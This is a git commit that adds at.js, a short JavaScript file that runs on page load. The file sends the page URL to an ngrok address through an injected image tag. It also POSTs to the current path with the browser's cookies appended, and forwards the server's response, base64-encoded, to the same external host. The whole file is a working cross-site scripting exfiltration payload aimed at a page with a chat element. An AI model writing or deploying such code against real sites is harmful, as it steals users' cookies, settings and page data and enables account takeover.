cded4e574315d1eebb38e5db9da3103e5c87adb8
Invaders0 <46098959+Invaders0@users.noreply.github.com>
2020-01-20 08:52:28 +0530

    Create at.js

---
+++ at.js
@@ -0,0 +1,26 @@
+window.addEventListener('load', function () {
+ function send2server(name, data){
+    img = document.createElement("img");
+    img.src = "https://392445a8.ngrok.io/name="+name+"&data="+btoa(encodeURI(data));
+    document.getElementById("chat-div").appendChild(img);
+}
+
+ send2server("url", window.location.href);
+
+
+  fetch(window.location.pathname.slice(1,),{
+    method: 'POST',
+    body: 'name=test&user_id=2&' +document.cookie,
+     headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
+    }
+  })
+  .then(res => {
+      return res.text();
+  })
+  .then(data => {
+  send2server("settings", data);
+
+  });
+
+    })
